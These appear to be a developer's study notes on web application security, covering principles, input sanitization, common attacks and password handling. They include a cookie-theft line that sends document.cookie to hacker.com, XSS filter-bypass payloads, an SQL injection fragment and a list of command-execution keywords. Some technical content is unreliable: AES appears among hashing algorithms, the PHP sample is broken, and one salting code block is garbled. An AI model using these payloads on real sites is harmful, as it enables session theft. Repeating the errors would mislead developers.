## Introduction

### Introduction

- Overview
- Different type of hacks
- Fundamental Security Principle
- Techniques behind the most common attacks on your server

## 1. Security Overview

### What is security?
- Definition: Keep a web server and its applications protected or safe from harm
- Awareness + Protection = Security
- General principle to follow
- Most common attacks
- Useful strategies

### Why security matters
- The low threshold of entry may leave the impression that web development is easy
- 

### What is a hacker?

### Total security is unachievable

> The only secure computer is one that's unplugged, locked in a safe, and buried 20 feet under the ground in a secret location... and I'm not even too sure about that one.
> —Dennis Hughes, FBI
From: <https://en.wikibooks.org/wiki/UNIX_Computing_Security/Introduction>

- There are always ways to gain access that we don't expect.
- Newly discovered vulnerabilities are called zero-day exploits.
- zero-day exploits: known only to hackers, kept secret and traded
- How much security?
    - Should match your needs and goals
    - Execute the security you need really well
    - Re-evaluate periodically

### Get in the security mind-set

- Everyone, all the time
- Weakest link in your security is your level of security
- Average users have to be mindful of security
- Decision makers have to be mindful of security
- Security may require time and money
- Allocate for security in project timelines

Regular security reviews
- Review all technology in use
- Review code in use and still in development
- Review procedures
- Review access privileges
- Educate and re-educate


Better developers
- Fully learn technologies
- Better programmers write more secure programs
- Write software tests for common security concerns

### Write a security policy

Security policy
- Communicates how information assets are protected
- Rules or guidelines
- Keep it simple, clear, and easy to follow
- Involve all stakeholders
- Review periodically - security concerns change

## 2. General Security Principles

### Least privilege

- > We assume that because they're friendly, they wouldn't do us harm
- > "Every program and every privileged user of the system should operate using the least amount of privilege necessary to complete the job. - Jerome Saltzer, Communications of the ACM"
- <https://en.wikipedia.org/wiki/Principle_of_least_privilege>
- Code should be limited in what it exposes and what it accesses.

```php
class User {
    public $valid_users = array('tom', 'mary', 'steve');
    public $password = 'secretpassword'

    public function authenticate($user, $pwd) {
        return in_array($user, $valid_users) && password_matches($pwd);
    }

    public function password_matches($pwd) {
        return $password == $pwd;
    }
}
```

Least Privilege Benefits
- Code stability
    - Controlled data access
    - Easier to test actions and interactions
- System security
    - Vulnerabilities are limited and localized

### Simple is more secure

- Complexity invites bugs
- Use clearly named functions and variables
- Write code comments
- Break up long section of code into small functions
- Don't repeat yourself
- Legacy code is a security concern
- Built-in functions are often better than your own version
- Disable or remove unused feature when possible

### Never trust users

- Well-meaning users can cause problems
- Be paranoid: You have to adopt the mindset that everyone is out to get you. 
- Don't even trust admin users completely
    - Can become unhappy employees or ex-employees
    - May not take security seriously
    - Can have identity stolen
- Use caution with contractors
    - Both insider and outsider status
    - Often not fully vetted
    - Often transient
    - Make it easy to revoke their access
- Even offline
    - Phone: the famous hacker Kevin Mitnick recounts that much of his computer hacking was done by calling up people on the telephone and convincing them that he was trustworthy
    - Email
    - Printing

### Expect the unexpected
- Security is not reactive: your job is to figure out how that will happen ahead of time
- Prevent the crime before it happens
- "What are all the things a user could try on this page?
- Consider "edge cases"
- Get creative
- Example: Global search box
    - Length: too little or too much
    - Content-type: high-ASCII, multi-byte
    - Content: \"'(){}@#%@^%^#^&
    - Formats: safe for use in all formats
    - Structure and inputs: can they be modifed

### Defense in depth
- is like having an extra (backup) parachute for yourself.
- Layered defenses
- Redundant security
- Dimensions
    - People 
    - Technology
    - Operations

### Security through obscurity
- More information benefits hackers: e.g. `Apache 2.2` or URL includes a file ending that gives away the language or the technology that you're using
- Limit exposed information
- Limit feedback
    - On a login page, if a username and password don't match, don't say which one of the two failed.
    - On a page that allows you to retrieve a forgotten password, you shouldn't acknowledge whether or not a user name is in the database
- Obscurity does not mean misdirection


### Blacklisting and whitelisting
- Blacklisting: "No access" list
- Whitelisting: Reference list for what is permitted (more secured approach)
- Example
    - html tags: whitelist or blacklist

### Map exposure points and data passageways
- Incoming Exposure Points
    - URLs
    - Forms
    - Cookies/Sessions
    - Database reads
    - Your public APIs
- Outgoing Exposure Points
    - HTML
    - JavaScript/JSON/XML/RSS
    - Cookies/Sessions
    - Database writes
    - Third-party APIs
- Understand site topography

## 3. Filtering Input, Controlling Output

### Regulating requests
- *Scenario*: attachment upload
- `GET` requests: URLs, links
- `POST` requests: forms
- `CONNECT`, `DELETE`, `HEAD`, `OPTIONS`, `PUT`, `TRACE`
- Regulate Request/Response Format
    - Request `Content-Type` is format of the sent data
    - Request `Accept` is format for the returned data
    - HTML, JSON, XML, Text
    - Any MIME type (RSS, PDF, image, audio, video)

### Validating input
- Is the input acceptable?
- Determine data expectations
- Prevent bugs, as well as hacks
- Consider application and database requirements
- Only allow expected data in submission
- Common Validations
    - Presence / Length
    - Type
    - Format
    - Within a set of values
    - Uniqueness (for example: user name, blog title)
- Whitelisting vs. blacklisting
- Double-check validation logic

### Sanitizing data
- Is the data potential dangerous? (stored in SQL database/used in JavaScript)
- Neutralize, render harmless
- Use type casting vs. Type juggling
- Sanitize SQL, HTML, JavaScript, JSON, XML, etc
    - Encode Characters: Replacing powerful characters with harmless equivelents
        - HTML: `<` with `&lt;`
    - Escaping Characters: Add escape characters before powerful characters
        - SQL: `WHERE name='fake\' AND 1=1--'`
    - Do not write custom sanitization methods
        - Use well-tested, language-specific functions
    - Do not remove or correct invalid data
```js
    // Hacker tries:
Input = "<script>alert ("Gotcha!");</script>"
// You remove <script> and </script> tags:
Input = "alert("Gotcha!")"
// Hacker tries:
Input = "<scr<script>ipt>alert ("Gotcha!");</scr</script>ipt>"
// You remove <script> and </script> tags:
input  = "<script>alert ("Gotcha!");</script>"
```
- Consider where the data will go
- Consider where the data might go later
- Sanitize early, sanitize late, sanitize often    

### Labeling variables
- Use names to identify condition of data
- `dirty`, `raw`, `tainted`, `unsafe`
- `clean`, `filtered`, `sanitized`, `safe`
```php
$raw_email = $_POST['email'];
$safe_email = sanitize($raw_email);
// More often than not you would just do it as a one step process
$safe_email = sanitize($_POST['email]);
```
```ruby
dirty = {}
clean = {}
dirty["first_name"] = params["user"]["first_name"]
clean["first_name"] = sanitize(dirty["first_name"])

clean_params = {}
clean_params["first_name"] = sanitize(params["user"]["first_name"])
```


### Keeping code private
- Public directory
    - Accessible by the web server
    - Point of entry to your web site or application
    - Be smart about code in public pages
- Library directory
	- Not accessible by the web server 
	- Accessible by your code via the file system
- Web server configuration
    - Set document root (public directory)
    - Allow/deny access
- `.htacess` file (apache)
    - Authorization, authentication, blocking

### Keeping credentials private
- Plain text credential are dangerous
    - Give them highest level of care
    - Keep them separate from code
    - Keep them out of version control systems (hard to purge from the history)
    - Have as few copies as necessary
    - Developers should all have their own separate databases
- Do not reuse passwords
    - Unique for every computer, environment, database
- Prefer hashed password whenever possible
- Public-key cryptography
    - example: SSH keys
    - different from using a password: we don't send our password, we don't send our private key
    - SSH agent, Keychain(one master password)
    - SSH agent forwarding

### Keeping error messages vague
- Turn off detailed error reporting for production server
- Return generic 404 and 500 error pages
- Developers can look up errors in log files 
- Configure web server to use same error pages
- Should not give any indication of where things went wrong (server level or application level)

### Smart logging
- Errors
- Sensitive actions (such as logging in, exporting files, deleting database records)
- Possbile attacks
- Data Worth Logging
    - Date and time
    - Source (user and/or IP)
    - Action
    - Target
    - Cookie/session
    - URL and all parameters (raw request)
    - Backtrace (error stack)
- Activity Logging
    - Keep an activity History or Audit Trail
        - Add database table called 'logs'
        - Write a function to add entries with a timestamp
        - Call the fuction whenever an admin makes a change
    - Review logs routinely
- Don't log sensitive data
    - Beware POST parameters and database queries
    - Filter out passwords, keys, and tokens
- Keep old content
    - versioning
    - Paranoid delete

## 4. The Most Common Attacks

### Cross-site scripting (XSS)

### Cross-site request forgery (CSRF)

### SQL injection

### URL manipulation
- It's dangerous because it's so easy to execute  
- Simply editing the URL string to probe the site  
- Can be used for revealing private information
- Can be used for performing restricted actions   
- Examples
    - `http://yoursite.com?invoice=A-17391`
    - `http://yoursite.com?authorize?UserID=987655113`
    - `http://yoursite.com?SESSIONID=AG383DIJ98832`
    - `http://yoursite.com/product?preview=false`
    - `http://yoursite.com/images/small/rockymtns.jpg`
    - `http://yoursite.com/reports/export/sales`
- Solution
    - Realize that URLs are exposed and editable
    - Don't use obscurity for access control
    - Keep error messages vague
    - Clarify GET and POST requests
        - `GET` requests should be idempotent (no changes) 
        - `POST` requests should be used for making changes

### Faked requests and forms
- Normally the request header information is generated by the browser, 
and we don't ever actually work with that header information. 
- But they can also be manufactured, aka, **faked** or **spoofed**
- Faked Requests
```
GET /somepath HTTP/1.1
Host: somesite.com
Referer: 
User-Agent: 
Accept:
Accept-Language:
Accept-Encoding:
Accept-Charset:
Cookie:
```
- Faked Forms
    - Can be used to edit hidden field values
    - Can be used to remove client-side validation
    - e.g. Length limit with JavaScript 
- Fakes Forms Solution
    - Do not reply on client-side data validation
- Use CSRF token

### Cookie visibility and theft
- Cookies can be stolen using XSS attack
``'http://hacker.com?steal=' + document.cookie``
- Cookies can be sniffed by observing network traffic
- Cookie Solutions
    - Only put non-sensitive data in cookies (e.g., preferences)
    - Use `HttpOnly` cookies
        - will make the cookie unavailable to JavaScript
        - Still not supported by older browsers
    - Use Secure cookies (HTTPS only), which means you can't eavesdrop on them
    - Set cookie expiration date
    - Set cookie domain and path
- Encrypt cookie data
- Use server-side sessions instead of client-side cookies (not considering session hijecking yet)

### Session hijacking

- Session ID is used to reference sensitive data on the server  
- Similar to cookie theft but much more valuable
- Can be used to assume your identity and logged-in status
- Can be used to steal personal info, change password
- Often done by network eavesdropping
    - Beware of open wireless networks at coffe shops!
- Session hijacking Solutions
    - Save user agent in session and confirm it(weak)
    - Check IP address (buggy)
    - Use `HttpOnly` cookies
- Regenerate session identifier periodically, at key points
- Expire/remove old session files regularly
    - Keep track of last activity in session 
- Use SSL
- Use Secure cookies

### Session fixation

- A hacker gives you a session ID to use instead 
- Example
```
GET /login HTTP/1.1
Host: yourbank.com
Cookie: SESSION_ID=3e3531fa4ba...

http://yourbank.com/login?SESSION_ID=a1b2c3d4e5...
```
- Session Fixation Solutions
    - Regenerate session identifier periodically, at key points
    Especially important to regenerate after log in

### Remote system execution

- Remotely run operating system commands on a web server
- System Execution Keywords
```
system
exec
shell
sh
shell_exec
open
popen
proc_open
call
subprocess
spawn
passthru
eval
%x
`
```
- Solution
    - Avoid system execution keywords
    - Understand the commands and their syntax completely
    - Perform system execution with extreme caution
    - Add additional data validations

### File-upload abuse

- Can be used to upload too much 
- Can be used to upload malicious files
- Solution
    - Require user authentication, no anonymous uploads
    - Limit maximum upload size
    - Limit allowable file formats, file extensions
    - Use caution when opening uploaded files
    - Do not host uploaded files which have not been verified (virus-scan)

### Denial of service

- Attempt to make a server unavailable to users
- Usually performed by overloading a server with requests
- Includes DNS and routing disruption
- Includes using up disk space, processor power, bandwidth
- Attacks often preformed by distributed network ("DDoS")
- Cheap to launch, difficult to prevent
- Solution
    - Firewalls
    - Switches and routers
    - Load management hardware / software (load-balancer)
    - Collection of reverse proxies
    - Keep infrastructure up to update
    - Make network traffic visible
    - Develop a response plan
    - "Black hole" or "null route" traffic

## 5. Encryption and User Authentication

### Password encryption

- Never store password in plain text
- Compromises user on your site
- Compromises user on other sites
- One-way encryption (hashing algorithm)
    - One-way means non-reversible, even by us
    - **Same inputs + same hashing algorithm = same output**
    - Encrypt attempted password, compare against stored one
- Hashing algorithms 
    - MD5: not considered safe anymore (rainbow)
    - SHA-1
    - SHA-2
    - Whirlpool
    - Tiger
    - AES
    - **Blowfish**
        - Slow: againt brute-force attacks
        - Secure
        - Free
        - Easy

### Salting passwords

- Rainbow tables: pre-computed tables of password hashes for each hashing algorithm 
- Salting
    - Additional data added to the password before encryption
    ```js
- Store salt in Database
    - When using user data for salt and user data could change
    - When using random salt
    - Just the salt, not the password
    const saltedPassword = `Put salt on the ${password}`
    ```
    - Knowing password requires also knowing the salt string
    - Rainbow tables could be used, but they would be almost impossible large
- Unique Salt
    ```js
    const uniqueSaltedPassword = `Put salt on the ${password} for ${username}`
    ```
    - Knowing password requires also knowing the salt string and username
- Random Salt
    ```js
    const uniqueSaltedPassword = `Put salt on the ${password} at ${timestamp}`
    ```
- Store salt in Database
    - When using user data for salt and user data could change
    - When using random salt
    - Just the salt, not the password

### Password requirements
- Require length, but do not limit length. (The hashed values would always be of the same length)
- Require non-alphanumeric characters (against simple rainbow table)
- Confirm password
- Report password strength: weak, normal, or strong?
- Do not record a password hint
- Security questions are questionable 

### Brute-force attacks
- Systematically trying all possible input combinations until the correct solution is found
- aka "Exhaustive key search"
- Dictionary attack
- KeySpace^KeyLength * TimePerAttempt = TimeRequired

### Using SSL for login

### Protecting cookies

### Regulating access privileges

### Handling forgotten passwords

### Multi-factor authentication

## 6. Other Areas of Concern

### Credit card payments

### Regular expression flaws

### Conversions and transformations

### Buffer overflows

### Source code managers

### Database security

### Server security

## Conclusion

### Goodbye
